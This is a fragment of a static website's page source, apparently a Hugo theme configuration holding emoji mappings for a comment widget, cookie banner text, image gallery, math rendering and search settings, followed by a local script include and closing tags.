"space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
